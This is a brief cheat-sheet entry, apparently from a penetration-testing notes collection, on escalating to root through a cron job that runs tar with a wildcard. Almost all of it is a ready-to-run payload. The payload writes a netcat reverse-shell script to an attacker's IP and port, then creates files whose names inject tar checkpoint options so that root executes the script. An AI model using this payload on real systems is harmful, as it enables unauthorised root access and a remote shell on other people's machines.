# Tar

## Wildcard
When a crontab job is running as root and executing tar with a wildcard `tar *`.
Go to the folder that is being compressed and run the following payload.

```bash
echo "mkfifo /tmp/lhennp; nc [ip] [port] 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
```
